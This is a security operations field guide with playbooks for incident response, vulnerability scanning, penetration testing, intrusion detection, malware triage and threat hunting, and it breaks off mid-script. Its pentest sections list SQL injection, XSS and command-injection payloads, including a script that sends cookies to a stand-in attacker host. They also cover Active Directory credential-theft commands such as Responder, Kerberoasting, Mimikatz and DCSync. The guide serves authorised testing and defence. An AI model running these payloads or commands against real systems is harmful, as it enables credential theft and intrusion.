# Cybersecurity Operational Playbooks
## Practical Field Guide for Daily Security Operations

---

# Table of Contents
1. [Incident Response Playbooks](#incident-response-playbooks)
2. [Vulnerability Assessment Playbooks](#vulnerability-assessment-playbooks)
3. [Penetration Testing Playbooks](#penetration-testing-playbooks)
4. [Network Security Playbooks](#network-security-playbooks)
5. [Malware Analysis Playbooks](#malware-analysis-playbooks)
6. [Threat Hunting Playbooks](#threat-hunting-playbooks)

---

# Incident Response Playbooks

## PLAYBOOK 1: Suspected Account Compromise

### Trigger Indicators
- Unusual login locations/times
- Password reset requests
- Suspicious email activity
- Multi-factor authentication alerts
- Reports of unauthorized access

### Response Steps

#### Phase 1: Immediate Actions (0-15 minutes)
```
□ Confirm incident with affected user
□ Document initial report (who, what, when, where)
□ Notify security team and management
□ Preserve logs (email, authentication, VPN)
□ Take initial screenshots
```

#### Phase 2: Containment (15-60 minutes)
```
□ Disable/suspend compromised account
□ Reset password for affected account
□ Terminate all active sessions
□ Review and revoke API tokens/keys
□ Enable enhanced monitoring on account
□ Check for forwarding rules (email)
□ Review recent account activity
□ Identify lateral movement attempts
```

#### Phase 3: Investigation (1-4 hours)
```bash
# Email investigation
□ Check email rules and filters
□ Review sent items and deleted items
□ Check email forwards and delegates
□ Review calendar access and shares

# Authentication logs
□ Review successful logins (IPs, times, devices)
□ Check failed authentication attempts
□ Review MFA enrollment changes
□ Check password reset history

# Activity review
□ File access/downloads
□ Configuration changes
□ Data exfiltration indicators
□ Lateral movement attempts
```

#### Phase 4: Eradication (2-8 hours)
```
□ Remove malicious email rules
□ Remove unauthorized delegates
□ Delete suspicious emails
□ Remove unauthorized devices
□ Reset all compromised credentials
□ Clear cached credentials
□ Force sign-out all devices
```

#### Phase 5: Recovery (4-24 hours)
```
□ Restore account with new credentials
□ Re-enable MFA with new device
□ Restore legitimate email rules
□ Verify account settings
□ Restore delegates (if legitimate)
□ Monitor account for 72 hours
□ User re-authentication training
```

#### Phase 6: Post-Incident (1-7 days)
```
□ Complete incident report
□ Timeline documentation
□ Lessons learned session
□ Update security policies
□ User security awareness training
□ Implement additional controls
□ Close incident ticket
```

### Investigation Queries

#### O365/Azure AD
```powershell
# Recent sign-ins
Get-AzureADAuditSignInLogs -Filter "userPrincipalName eq 'user@domain.com'" | Select-Object CreatedDateTime, UserPrincipalName, IPAddress, Location, Status

# Recent activities
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) -UserIds user@domain.com

# Mailbox rule changes
Search-MailboxAuditLog -Identity user@domain.com -LogonTypes Owner,Delegate -ShowDetails | Where-Object {$_.Operation -eq "New-InboxRule"}
```

#### Linux Systems
```bash
# Authentication logs
grep "user" /var/log/auth.log
grep "Failed password" /var/log/auth.log
last -f /var/log/wtmp
lastb -f /var/log/btmp

# User activity
history -r /home/user/.bash_history
find /home/user -type f -mtime -7
```

#### Windows Systems
```powershell
# Event log analysis
Get-EventLog -LogName Security -InstanceId 4624,4625 | Where-Object {$_.Message -like "*username*"}

# Login history
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624}

# PowerShell history
Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

---

## PLAYBOOK 2: Ransomware Incident

### Trigger Indicators
- Multiple files encrypted with unusual extensions
- Ransom notes appearing on systems
- Inability to access files
- Suspicious scheduled tasks
- Network share encryption
- Performance degradation

### Response Steps

#### Phase 1: Immediate Actions (0-5 minutes) ⚠️ CRITICAL
```
□ DO NOT REBOOT infected systems
□ Isolate infected systems from network (pull cable)
□ Alert security team and management IMMEDIATELY
□ Activate incident response team
□ Document everything with timestamps
```

#### Phase 2: Containment (5-30 minutes)
```
□ Identify patient zero
□ Isolate all affected systems
□ Disable wireless connections
□ Disconnect VPN connections
□ Identify ransomware variant (ransom note, file extensions)
□ Check backup integrity
□ Disable user accounts on infected systems
□ Block C2 domains/IPs at firewall
□ Disconnect backups from network
```

#### Phase 3: Assessment (30 minutes - 2 hours)
```bash
# Identify scope
□ Number of affected systems
□ Types of files encrypted
□ Network shares affected
□ Database servers impacted
□ Backup system status
□ Cloud storage impact

# Collect evidence
□ Ransom note (screenshot, copy text)
□ Sample encrypted files
□ Running processes
□ Network connections
□ Scheduled tasks
□ Registry autorun keys
□ Event logs
```

#### Phase 4: Identification
```bash
# Identify ransomware variant
1. Upload ransom note to ID Ransomware (https://id-ransomware.malwarehunterteam.com/)
2. Upload encrypted file sample
3. Check extension against known ransomware
4. Search for decryption tools

# File analysis
file encrypted_file
strings encrypted_file | head -50
exiftool encrypted_file
```

#### Phase 5: Eradication
```bash
# DO NOT PAY RANSOM (unless legally authorized)

# Remove infection
□ Boot into safe mode or live USB
□ Run antimalware scans
□ Remove scheduled tasks
□ Remove registry persistence
□ Remove suspicious files
□ Check for secondary infections
□ Verify removal with multiple tools
```

```bash
# Windows cleanup
# Safe mode boot
# Run in Command Prompt (Admin)
sfc /scannow
DISM /Online /Cleanup-Image /RestoreHealth

# Remove persistence
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
schtasks /query /fo LIST /v
```

#### Phase 6: Recovery
```bash
# Restore from backups
□ Verify backup integrity
□ Test restore on isolated system
□ Restore critical systems first
□ Validate restored data
□ Check for persistence mechanisms
□ Apply security patches
□ Change all passwords
```

```bash
# Check for free decryptors
# Visit No More Ransom Project
# https://www.nomoreransom.org/

# File recovery attempts (if no backup)
photorec /dev/sda1
testdisk /dev/sda
```

#### Phase 7: Post-Incident
```
□ Complete forensic analysis
□ Root cause analysis
□ Update security controls
□ Patch vulnerabilities
□ Implement EDR/XDR
□ User security training
□ Backup validation process
□ Incident report to management
□ Law enforcement notification (if required)
□ Insurance notification
```

### Prevention Checklist
```
□ Regular offline backups (3-2-1 rule)
□ Endpoint protection with behavior analysis
□ Email security and filtering
□ User security awareness training
□ Patch management process
□ Network segmentation
□ Principle of least privilege
□ MFA on all critical systems
□ Application whitelisting
□ Regular security audits
```

---

## PLAYBOOK 3: Data Breach Response

### Trigger Indicators
- Unusual data transfers
- Database dumps detected
- Credentials found on dark web
- External notification of breach
- Suspicious database queries
- Data appearing on breach sites

### Response Steps

#### Phase 1: Detection & Initial Assessment (0-1 hour)
```
□ Confirm breach indicators
□ Identify data classification level
□ Estimate scope (number of records)
□ Identify affected systems
□ Activate incident response team
□ Preserve evidence
□ Begin timeline documentation
```

#### Phase 2: Containment (1-4 hours)
```
□ Isolate affected systems
□ Block unauthorized access
□ Reset compromised credentials
□ Patch vulnerabilities
□ Review access logs
□ Implement enhanced monitoring
□ Secure backup systems
```

#### Phase 3: Investigation (4-48 hours)
```bash
# Data analysis
□ What data was accessed?
□ How was data exfiltrated?
□ When did breach occur?
□ Who is responsible (threat actor)?
□ What vulnerability was exploited?

# Log analysis
□ Database access logs
□ File access logs
□ Network traffic logs
□ Authentication logs
□ Application logs
□ Firewall logs
```

```bash
# Database investigation
# MySQL
SELECT * FROM mysql.general_log WHERE event_time > 'YYYY-MM-DD';
SHOW PROCESSLIST;

# PostgreSQL
SELECT * FROM pg_stat_activity;

# Check for data exfiltration
grep -i "SELECT.*FROM" /var/log/mysql/mysql.log
grep -i "DUMP" /var/log/mysql/mysql.log
```

#### Phase 4: Eradication (24-72 hours)
```
□ Remove attacker access
□ Patch all vulnerabilities
□ Update security configurations
□ Remove malware/backdoors
□ Harden systems
□ Implement security controls
```

#### Phase 5: Recovery (3-7 days)
```
□ Restore systems from clean backups
□ Verify data integrity
□ Implement additional security
□ Reset all credentials
□ Re-enable systems gradually
□ Monitor for re-compromise
```

#### Phase 6: Notification & Compliance (1-72 hours from discovery)
```
⚠️ Legal/Regulatory Requirements

□ Internal notification
  - Executive management
  - Legal counsel
  - PR/Communications
  - Compliance officer

□ External notification (if required)
  - Affected individuals (GDPR: 72 hours)
  - Regulatory bodies
  - Law enforcement
  - Credit bureaus
  - Insurance provider
  - Business partners

□ Documentation
  - What data was breached
  - How many records affected
  - What mitigation steps taken
  - Contact information for questions
```

#### Phase 7: Post-Incident (1-30 days)
```
□ Forensic analysis report
□ Root cause analysis
□ Lessons learned session
□ Security improvement plan
□ Policy updates
□ User training
□ Penetration testing
□ Compliance audit
□ Final incident report
```

### Breach Investigation Queries

```sql
-- Suspicious database activity
SELECT * FROM information_schema.processlist 
WHERE command != 'Sleep' AND user != 'system_user';

-- Large data extractions
SELECT * FROM mysql.slow_log 
WHERE query_time > 10 
ORDER BY start_time DESC;

-- Failed authentication attempts
SELECT * FROM failed_logins 
WHERE timestamp > DATE_SUB(NOW(), INTERVAL 24 HOUR)
GROUP BY username 
HAVING COUNT(*) > 10;
```

---

# Vulnerability Assessment Playbooks

## PLAYBOOK 4: Internal Network Assessment

### Objective
Identify vulnerabilities in internal network infrastructure

### Scope Definition
```
□ IP ranges to scan
□ Systems in/out of scope
□ Testing timeframe
□ Authorized contacts
□ Rules of engagement
□ Approval documentation
```

### Phase 1: Network Discovery (1-2 hours)
```bash
# Ping sweep
nmap -sn 10.0.0.0/24 -oA discovery_scan

# Quick port scan
nmap -sS -T4 -p- 10.0.0.0/24 -oA quick_scan

# Service version detection
nmap -sV -O 10.0.0.0/24 -oA service_scan

# Detailed scan of discovered hosts
nmap -sC -sV -O -p- target_host -oA detailed_scan
```

### Phase 2: Service Enumeration (2-4 hours)
```bash
# SMB enumeration
enum4linux -a target_host
smbclient -L //target_host
smbmap -H target_host
crackmapexec smb target_host -u '' -p ''

# HTTP/HTTPS enumeration
nikto -h http://target_host
whatweb target_host
curl -I http://target_host

# FTP enumeration
nmap -p 21 --script ftp-* target_host

# SNMP enumeration
snmpwalk -v 2c -c public target_host
onesixtyone -c community.txt target_host

# DNS enumeration
dig @dns_server domain.com ANY
dig @dns_server domain.com AXFR
dnsrecon -d domain.com
```

### Phase 3: Vulnerability Scanning (2-6 hours)
```bash
# Nmap NSE vulnerability scan
nmap --script vuln target_host -oA vuln_scan

# OpenVAS scan
# Launch from web interface

# Nessus scan
# Launch from web interface

# Manual checks
testssl.sh https://target_host
sslscan target_host
```

### Phase 4: Manual Testing (4-8 hours)
```bash
# Web application testing
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w wordlist.txt

# Check for default credentials
hydra -C /usr/share/seclists/Passwords/Default-Credentials/default-credentials.csv target protocol

# SQL injection testing
sqlmap -u "http://target/page?id=1" --dbs

# File upload testing
# Test upload restrictions
# Try various file types
# Check for path traversal
```

### Phase 5: Analysis & Prioritization (2-4 hours)
```
Risk Matrix:
┌─────────────┬──────────┬──────────┬──────────┐
│             │   Low    │  Medium  │   High   │
├─────────────┼──────────┼──────────┼──────────┤
│ Critical    │ Medium   │   High   │ Critical │
├─────────────┼──────────┼──────────┼──────────┤
│ High        │  Low     │  Medium  │   High   │
├─────────────┼──────────┼──────────┼──────────┤
│ Medium      │  Low     │   Low    │  Medium  │
├─────────────┼──────────┼──────────┼──────────┤
│ Low         │  Info    │   Low    │   Low    │
└─────────────┴──────────┴──────────┴──────────┘
               Likelihood
```

```
Prioritization criteria:
□ CVSS score
□ Exploit availability
□ Asset criticality
□ Data sensitivity
□ Exposure level
□ Business impact
```

### Phase 6: Reporting (4-8 hours)
```
Report Structure:
□ Executive Summary
  - Overview of findings
  - Risk summary
  - Key recommendations
  
□ Methodology
  - Tools used
  - Testing approach
  - Limitations
  
□ Findings
  - Vulnerability description
  - Affected systems
  - Risk rating
  - Proof of concept
  - Remediation steps
  - References (CVE, etc.)
  
□ Recommendations
  - Prioritized action plan
  - Quick wins
  - Long-term improvements
  
□ Appendices
  - Detailed scan results
  - Tool outputs
  - Screenshots
```

### Common Vulnerability Checks

#### Critical Findings
```bash
# Check for MS17-010 (EternalBlue)
nmap -p 445 --script smb-vuln-ms17-010 target

# Check for BlueKeep (CVE-2019-0708)
nmap -p 3389 --script rdp-vuln-bluekeep target

# Check for Log4Shell
nmap -p 8080 --script http-vuln-cve2021-44228 target

# Check for Shellshock
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/test.sh target
```

#### High Findings
```bash
# Default credentials
hydra -C default-creds.txt target protocol

# Weak SSL/TLS
testssl.sh --severity HIGH target

# Anonymous FTP
ftp target
# Try: anonymous / anonymous

# Open SMB shares
smbclient -L //target -N
```

---

## PLAYBOOK 5: External Perimeter Assessment

### Objective
Assess external-facing systems and identify attack surface

### Phase 1: Asset Discovery (1-3 hours)
```bash
# Subdomain enumeration
subfinder -d domain.com -o subdomains.txt
amass enum -d domain.com
assetfinder --subs-only domain.com

# DNS reconnaissance
dig domain.com ANY
dig domain.com MX
dig domain.com NS
host -t ns domain.com

# Reverse DNS
for ip in $(cat ip_list.txt); do host $ip; done

# SSL certificate transparency
curl -s "https://crt.sh/?q=%.domain.com&output=json" | jq -r '.[].name_value' | sort -u

# Shodan
shodan search "org:\"Company Name\""
```

### Phase 2: Port Scanning (2-4 hours)
```bash
# Quick scan of common ports
nmap -sS -T4 -Pn -p 80,443,22,21,25,3389,8080,8443 target -oA quick

# Full port scan
nmap -sS -T4 -Pn -p- target -oA fullscan

# Service detection
nmap -sV -sC -p $(cat ports.txt) target -oA detailed
```

### Phase 3: Web Application Assessment (4-8 hours)
```bash
# Technology identification
whatweb -a 3 https://target.com
wappalyzer (browser extension)

# Directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt,pdf

# Vulnerability scanning
nikto -h https://target.com
nuclei -u https://target.com -severity critical,high

# SSL/TLS assessment
sslyze --regular target.com
testssl.sh https://target.com

# Header analysis
curl -I https://target.com
```

### Phase 4: Email Security Assessment (1-2 hours)
```bash
# SPF record check
dig target.com TXT | grep spf

# DMARC record check
dig _dmarc.target.com TXT

# DKIM record check
dig default._domainkey.target.com TXT

# MX record check
dig target.com MX
```

### Phase 5: Cloud Asset Discovery (2-4 hours)
```bash
# AWS S3 buckets
aws s3 ls s3://company-name --no-sign-request
# Try common naming: company, company-name, company-backup, etc.

# Azure storage
# Try: https://companyname.blob.core.windows.net/
# Try: https://company-name.blob.core.windows.net/

# Google Cloud Storage
# Try: https://storage.googleapis.com/company-name
# Try: https://storage.googleapis.com/companyname

# Check for exposed credentials
grep -r "api_key\|apikey\|api-key" source_code/
grep -r "secret\|password\|token" source_code/
```

### Phase 6: Information Leakage Check (2-3 hours)
```bash
# Google dorking
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:target.com ext:sql | ext:txt | ext:log

# GitHub reconnaissance
# Search for: "company.com" password
# Search for: "company.com" api_key
# Search for: "company.com" secret

# Pastebin/paste sites
# Search for company domain
# Search for employee emails
```

### Deliverables Checklist
```
□ Asset inventory (IPs, domains, subdomains)
□ Open ports and services
□ Web application findings
□ Email security posture
□ Cloud exposure
□ Information leakage
□ Prioritized risk assessment
□ Remediation recommendations
```

---

# Penetration Testing Playbooks

## PLAYBOOK 6: Web Application Penetration Test

### Phase 1: Information Gathering
```bash
# Application mapping
□ Identify entry points
□ Map application flow
□ Identify user roles
□ Document functionality
□ Identify technologies used

# Tools
whatweb -a 3 https://target.com
wappalyzer
builtwith.com
```

### Phase 2: Authentication Testing
```bash
# Test for:
□ Weak password policy
□ Username enumeration
□ Account lockout mechanism
□ Session management
□ Remember me functionality
□ Password reset flow
□ Multi-factor authentication bypass

# Brute force (authorized testing only)
hydra -l admin -P passwords.txt https://target.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# Session testing
# Check cookie flags: Secure, HttpOnly, SameSite
# Test session timeout
# Test session fixation
# Test for concurrent sessions
```

### Phase 3: Authorization Testing
```bash
# Test for:
□ Horizontal privilege escalation
□ Vertical privilege escalation
□ Insecure Direct Object Reference (IDOR)
□ Missing function level access control

# IDOR testing
# Try accessing other users' resources
/user/profile?id=123
/user/profile?id=124
/api/user/123/details
/api/user/124/details

# Privilege escalation
# Access admin functions as regular user
/admin/users
/api/admin/settings
```

### Phase 4: Input Validation Testing

#### SQL Injection
```sql
# Authentication bypass
' OR '1'='1'--
admin'--
' OR '1'='1'/*

# Error-based
' AND 1=CONVERT(int,(SELECT @@version))--

# Union-based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password,email FROM users--

# Boolean-based blind
' AND 1=1--
' AND 1=2--

# Time-based blind
'; WAITFOR DELAY '00:00:05'--
' OR SLEEP(5)--
```

#### XSS Testing
```html
# Reflected XSS
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Stored XSS
<script>document.location='http://attacker.com/?c='+document.cookie</script>

# DOM XSS
# Check JavaScript that processes URL parameters
# Test with: #<script>alert('XSS')</script>
```

#### Command Injection
```bash
# Test inputs
; ls -la
| whoami
& ping -c 4 attacker.com
`cat /etc/passwd`
$(whoami)

# Common injection points
- File upload paths
- System command inputs
- Ping/traceroute utilities
- Image processing
```

#### File Upload Vulnerabilities
```
Test cases:
□ PHP web shell (shell.php)
□ Double extension (shell.php.jpg)
□ Null byte (shell.php%00.jpg)
□ MIME type manipulation
□ Path traversal (../../shell.php)
□ Large file DoS
□ Malicious file content
```

### Phase 5: Business Logic Testing
```
Test for:
□ Payment bypass
□ Coupon code abuse
□ Race conditions
□ Workflow bypass
□ Cart manipulation
□ Price manipulation
□ Negative values
□ Quantity manipulation
```

### Phase 6: Client-Side Testing
```javascript
# Local storage inspection
localStorage
sessionStorage

# Cookie inspection
document.cookie

# JavaScript analysis
# Check for:
- Sensitive data in JS
- API keys
- Internal URLs
- Debug code
```

### Test Report Template
```markdown
# Vulnerability Title

**Severity:** Critical/High/Medium/Low
**CVSS Score:** X.X
**CWE:** CWE-XXX

## Description
[Detailed description of vulnerability]

## Affected Components
- URL: https://target.com/vulnerable-page
- Parameter: vulnerable_param
- HTTP Method: POST

## Proof of Concept
1. Navigate to: https://target.com/vulnerable-page
2. Enter payload: [payload]
3. Observe: [result]

## Impact
[Business and technical impact]

## Remediation
1. [Step 1]
2. [Step 2]
3. [Step 3]

## References
- OWASP: [link]
- CVE: [CVE-XXXX-XXXX]
- CWE: [link]

## Evidence
[Screenshots]
```

---

## PLAYBOOK 7: Active Directory Penetration Test

### Phase 1: Initial Compromise
```bash
# Assuming network access obtained

# Network discovery
nmap -sn 192.168.1.0/24
crackmapexec smb 192.168.1.0/24

# Identify Domain Controller
nmap -p 88,389,636 192.168.1.0/24
```

### Phase 2: Enumeration
```bash
# Without credentials
enum4linux -a dc_ip
ldapsearch -x -h dc_ip -s base namingcontexts

# With credentials
crackmapexec smb dc_ip -u username -p password --users
crackmapexec smb dc_ip -u username -p password --groups
crackmapexec smb dc_ip -u username -p password --shares

# Bloodhound data collection
bloodhound-python -d domain.com -u username -p password -ns dc_ip -c all
```

### Phase 3: Credential Harvesting
```bash
# LLMNR/NBT-NS poisoning
responder -I eth0 -wrf

# SMB relay
ntlmrelayx.py -tf targets.txt -smb2support

# Kerberoasting
impacket-GetUserSPNs domain.com/username:password -dc-ip dc_ip -request

# AS-REP roasting
impacket-GetNPUsers domain.com/ -usersfile users.txt -dc-ip dc_ip
```

### Phase 4: Lateral Movement
```bash
# Pass the hash
crackmapexec smb 192.168.1.0/24 -u username -H ntlm_hash --local-auth

# PSExec
impacket-psexec domain/username:password@target_ip

# WMI
impacket-wmiexec domain/username:password@target_ip

# Check local admin access
crackmapexec smb 192.168.1.0/24 -u username -p password --local-auth
```

### Phase 5: Privilege Escalation
```bash
# Find Domain Admins
net group "Domain Admins" /domain

# Check privileges
whoami /priv
whoami /groups

# Mimikatz (on compromised system)
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
```

### Phase 6: Domain Dominance
```bash
# DCSync attack
impacket-secretsdump domain/username:password@dc_ip

# Golden ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ptt

# Silver ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-... /target:service.domain.com /service:cifs /rc4:hash /ptt
```

### Common AD Attacks Checklist
```
□ LLMNR/NBT-NS poisoning
□ SMB relay
□ Kerberoasting
□ AS-REP roasting
□ Password spraying
□ GPP password extraction
□ Unconstrained delegation
□ Constrained delegation
□ Pass the hash
□ Pass the ticket
□ Overpass the hash
□ DCSync
□ Golden ticket
□ Silver ticket
□ AdminSDHolder abuse
□ DCShadow
```

---

# Network Security Playbooks

## PLAYBOOK 8: Network Intrusion Detection

### Detection Use Cases

#### Port Scanning Detection
```bash
# Snort rule
alert tcp any any -> $HOME_NET any (msg:"Possible Port Scan"; flags:S; threshold: type threshold, track by_src, count 20, seconds 60; sid:1000001;)

# Investigation
tcpdump -nn -r pcap_file 'tcp[tcpflags] & tcp-syn != 0'
```

#### Brute Force Detection
```bash
# SSH brute force
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# RDP brute force (Windows)
Get-EventLog -LogName Security -InstanceId 4625 | Group-Object -Property Message | Select-Object Count, Name | Sort-Object Count -Descending

# Response
# Block source IP
iptables -A INPUT -s attacker_ip -j DROP
ufw deny from attacker_ip
```

#### Data Exfiltration Detection
```bash
# Large outbound transfers
tcpdump -nn -r pcap_file 'greater 10000' and dst net not 10.0.0.0/8
netstat -ant | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr

# DNS tunneling detection
# Look for:
- High volume of DNS queries
- Long domain names
- Unusual DNS record types (TXT, NULL)
- Queries to random subdomains

# Investigation
tshark -r capture.pcap -Y "dns" -T fields -e dns.qry.name | sort | uniq -c | sort -nr
```

#### Malware C2 Detection
```bash
# Indicators
- Beaconing (regular intervals)
- Connections to known bad IPs
- Unusual ports
- Encoded data in HTTP headers

# Beacon detection
zeek -r capture.pcap protocols/http/detect-web-beaconing.zeek

# Check connections
netstat -anp | grep ESTABLISHED
ss -tulpn
```

### Network Monitoring Tools

#### Zeek (Bro)
```bash
# Start Zeek
zeek -i eth0 local

# Analyze PCAP
zeek -r capture.pcap

# Check generated logs
# conn.log - All connections
# http.log - HTTP traffic
# dns.log - DNS queries
# files.log - File transfers
# ssl.log - SSL/TLS connections
```

#### Wireshark Filters
```
# HTTP traffic
http

# Specific IP
ip.addr == 192.168.1.100

# Port
tcp.port == 80

# SYN packets
tcp.flags.syn == 1 && tcp.flags.ack == 0

# Failed connections
tcp.flags.reset == 1

# Large packets
frame.len > 1000

# Suspicious protocols
ftp || telnet || rsh

# File transfers
http.request.method == "POST" || ftp-data
```

---

# Malware Analysis Playbooks

## PLAYBOOK 9: Malware Triage & Analysis

### Phase 1: Isolation & Collection
```bash
□ Isolate infected system
□ Document system state
□ Collect sample safely
□ Create hash (MD5, SHA256)
□ Check VirusTotal
□ Set up analysis environment
```

### Phase 2: Static Analysis
```bash
# File information
file malware.exe
exiftool malware.exe
strings malware.exe | grep -i "http\|ip\|password\|registry"

# PE analysis (Windows executables)
pefile malware.exe
peframe malware.exe

# Hash calculation
md5sum malware.exe
sha256sum malware.exe

# VirusTotal check
# Upload hash, not file (to avoid submission)
```

### Phase 3: Behavioral Analysis (Sandbox)
```bash
# Recommended sandboxes:
- Cuckoo Sandbox
- Any.run
- Joe Sandbox
- Hybrid Analysis

# Monitor:
□ File system changes
□ Registry modifications
□ Network connections
□ Process creation
□ Dropped files
□ Persistence mechanisms
```

### Phase 4: Network Analysis
```bash
# Capture traffic
tcpdump -i eth0 -w malware_traffic.pcap

# Analyze
wireshark malware_traffic.pcap

# Look for:
- C2 servers
- Downloaded payloads
- Exfiltrated data
- Domain names
- IP addresses
```

### Phase 5: Dynamic Analysis
```bash
# Windows monitoring
# Process Monitor (Procmon)
# Process Explorer
# Regshot (before/after)
# Wireshark
# Fakenet-NG (network simulation)

# Linux monitoring
strace ./malware
ltrace ./malware
tcpdump -i any -w capture.pcap &
./malware
```

### Indicators of Compromise (IOCs)
```
Extract and document:
□ File hashes
□ IP addresses
□ Domain names
□ URLs
□ Email addresses
□ Registry keys
□ File paths
□ Mutex names
□ Service names
□ User agents
```

---

# Threat Hunting Playbooks

## PLAYBOOK 10: Lateral Movement Hunting

### Hunt Hypothesis
"Attackers who have gained initial access will attempt lateral movement using SMB, WMI, or PSExec"

### Data Sources
- Windows Event Logs (Security, System, PowerShell)
- Network traffic (NetFlow, Zeek)
- EDR telemetry
- Sysmon logs

### Hunting Queries

#### Windows Event Logs
```powershell
# Logon Type 3 (Network logon)
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} | Where-Object {$_.Message -like "*Logon Type:			3*"}

# Admin share access
Get-WinEvent -FilterHashtable @{LogName='Security';ID=5140} | Where-Object {$_.Message -match '\\\\*\\C\$|\\ADMIN\$'}

# Service creation (PSExec indicator)
Get-WinEvent -FilterHashtable @{LogName='System';ID=7045} | Where-Object {$_.Message -like "*PSEXESVC*"}

# Remote PowerShell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';ID=4104}
```

#### Sysmon Queries
```powershell
# Process creation
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[EventData[Data[@Name='CommandLine'] and (contains(Data,'\\\\'))]]"

# Network connections to internal IPs
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" | Where-Object {$_.Id -eq 3 -and $_.Message -match "192.168"}
```

### Anomaly Detection
```bash
# Unusual authentication patterns
- Authentication from workstation to workstation
- Authentication outside business hours
- Multiple failed then successful authentication
- Privileged account used from workstation

# Network anomalies
- Internal port scanning
- Unusual SMB traffic
- WMI queries across network
- Large data transfers between workstations
```

### Response Actions
```
If lateral movement detected:
□ Isolate affected systems
□ Reset credentials
□ Hunt for additional compromised systems
□ Analyze attacker techniques
□ Implement detection rules
□ Update defensive tools
```

---

## PLAYBOOK 11: Persistence Mechanism Hunting

### Common Persistence Locations

#### Windows Registry
```powershell
# Check autorun keys
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

# PowerShell profile
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders

# Winlogon
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

#### Scheduled Tasks
```powershell
# List all scheduled tasks
schtasks /query /fo LIST /v

# Filter suspicious
schtasks /query /fo LIST /v | findstr /i "author\|taskname\|command"

# Check for unusual execution times
Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "SYSTEM"}
```

#### Services
```powershell
# List services
sc query state= all
Get-Service

# Check service binaries
wmic service get name,displayname,pathname,startmode

# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i /v "c:\windows\\" | findstr /i /v """
```

#### WMI Event Subscriptions
```powershell
# List WMI subscriptions
Get-WmiObject -Namespace root\subscription -Class __EventFilter
Get-WmiObject -Namespace root\subscription -Class __EventConsumer
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

### Linux Persistence

#### Cron Jobs
```bash
# Check cron for all users
for user in $(cut -f1 -d: /etc/passwd); do echo "### Cron for $user ###"; crontab -u $user -l; done

# System cron
cat /etc/crontab
ls -la /etc/cron.*
```

#### Init Scripts
```bash
# Check startup scripts
ls -la /etc/init.d/
ls -la /etc/systemd/system/
systemctl list-unit-files

# Check rc.local
cat /etc/rc.local
```

#### SSH Keys
```bash
# Check authorized_keys
find / -name authorized_keys 2>/dev/null
cat ~/.ssh/authorized_keys
```

---

# Quick Reference Cards

## Linux Command Quick Reference
```bash
# System Information
uname -a                    # Kernel version
cat /etc/*release           # OS version
hostname                    # Hostname
ifconfig / ip a            # IP address

# User Information
whoami                      # Current user
id                         # User ID and groups
who / w                    # Logged in users
last                       # Login history

# File Operations
find / -name file.txt      # Find file
find / -perm -4000         # Find SUID files
grep -r "text" /path       # Recursive search
ls -la                     # List with permissions

# Network
netstat -tulpn            # Listening ports
ss -tulpn                 # Socket statistics
ps aux                    # Running processes
top / htop                # Process monitoring

# Privilege Escalation
sudo -l                   # Sudo privileges
cat /etc/passwd           # User accounts
cat /etc/shadow           # Password hashes
```

## Windows Command Quick Reference
```cmd
# System Information
systeminfo                 # System details
hostname                   # Computer name
ipconfig /all             # Network configuration
whoami /all               # Current user info

# User Information
net user                  # Local users
net localgroup           # Local groups
net user username        # User details
net group /domain        # Domain groups

# Network
netstat -ano             # Network connections
route print              # Routing table
arp -a                   # ARP cache

# Process Information
tasklist                 # Running processes
wmic process list        # Process details
schtasks /query         # Scheduled tasks

# Services
sc query                 # Service status
wmic service list brief  # Service details
```

## Metasploit Quick Reference
```bash
# Basic Commands
search cve:2017         # Search exploits
use exploit/path        # Select module
show options            # View settings
set OPTION value        # Set option
run / exploit          # Execute

# Meterpreter
sysinfo                 # System info
getuid                  # Current user
ps                      # Processes
shell                   # Command shell
download file           # Download file
upload file             # Upload file
screenshot              # Take screenshot
hashdump                # Dump hashes
```

## SQL Injection Quick Reference
```sql
# Authentication Bypass
' OR '1'='1'--
admin'--
' OR 1=1#

# Union Attack
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

# Database Enumeration
' UNION SELECT table_name FROM information_schema.tables--
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

# Time-Based Blind
' OR SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--
```

---

# Automation Scripts

## Network Scanner Script
```bash
#!/bin/bash
# Quick network scanner

TARGET=$1
PORTS="21,22,23,25,80,443,445,3306,3389,8080"

echo "[*] Scanning $TARGET"

# Quick scan
echo "[*] Running quick port scan..."
